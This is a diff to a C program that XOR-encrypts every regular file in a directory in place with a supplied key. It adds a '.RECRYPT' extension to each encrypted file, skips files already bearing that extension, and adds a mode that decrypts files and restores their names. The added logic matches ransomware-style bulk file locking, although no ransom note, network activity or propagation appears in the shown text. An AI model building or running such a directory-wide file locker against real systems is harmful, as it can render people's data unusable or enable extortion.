@@ -1,5 +1,7 @@
 #include "crypto.h"
 
+#define ENCRYPTION_EXTENSION ".RECRYPT"
+
 void xor_encrypt(const char *key, unsigned char *data, size_t data_len) {
     size_t key_len = strlen(key);
     for (size_t i = 0; i < data_len; i++) {
@@ -7,7 +9,7 @@ void xor_encrypt(const char *key, unsigned char *data, size_t data_len) {
     }
 }
 
-void process_file(const char *file_path, const char *key) {
+void process_file(const char *file_path, const char *key, int decrypt_mode) {
     FILE *file = fopen(file_path, "rb+");
     if (!file) {
         perror("Error opening file");
@@ -37,10 +39,36 @@ void process_file(const char *file_path, const char *key) {
 
     free(buffer);
     fclose(file);
-    printf("Processed file: %s\n", file_path);
+
+    char new_file_name[BUFFER_SIZE];
+
+    if (decrypt_mode) {
+        // Decryption: Remove .RECRYPT extension
+        size_t path_len = strlen(file_path);
+        size_t ext_len = strlen(ENCRYPTION_EXTENSION);
+
+        if (path_len > ext_len && strcmp(file_path + path_len - ext_len, ENCRYPTION_EXTENSION) == 0) {
+            snprintf(new_file_name, sizeof(new_file_name), "%.*s", (int)(path_len - ext_len), file_path);
+
+            if (rename(file_path, new_file_name) == 0) {
+                printf("Decrypted file restored to: %s\n", new_file_name);
+            } else {
+                perror("Error restoring decrypted file name");
+            }
+        }
+    } else {
+        // Encryption: Add .RECRYPT extension
+        snprintf(new_file_name, sizeof(new_file_name), "%s%s", file_path, ENCRYPTION_EXTENSION);
+
+        if (rename(file_path, new_file_name) == 0) {
+            printf("Encrypted file renamed to: %s\n", new_file_name);
+        } else {
+            perror("Error renaming encrypted file");
+        }
+    }
 }
 
-void process_directory(const char *directory_path, const char *key) {
+void process_directory(const char *directory_path, const char *key, int decrypt_mode) {
     DIR *dir = opendir(directory_path);
     if (!dir) {
         perror("Failed to open directory");
@@ -53,10 +81,19 @@ void process_directory(const char *directory_path, const char *key) {
     while ((entry = readdir(dir)) != NULL) {
         snprintf(full_path, BUFFER_SIZE, "%s/%s", directory_path, entry->d_name);
 
-        // Check if it's a regular file
         struct stat file_stat;
         if (stat(full_path, &file_stat) == 0 && S_ISREG(file_stat.st_mode)) {
-            process_file(full_path, key);
+            if (!decrypt_mode) {
+                // Skip already encrypted files
+                size_t path_len = strlen(full_path);
+                size_t ext_len = strlen(ENCRYPTION_EXTENSION);
+
+                if (path_len > ext_len && strcmp(full_path + path_len - ext_len, ENCRYPTION_EXTENSION) == 0) {
+                    printf("Skipping already encrypted file: %s\n", full_path);
+                    continue;
+                }
+            }
+            process_file(full_path, key, decrypt_mode);
         }
     }
 
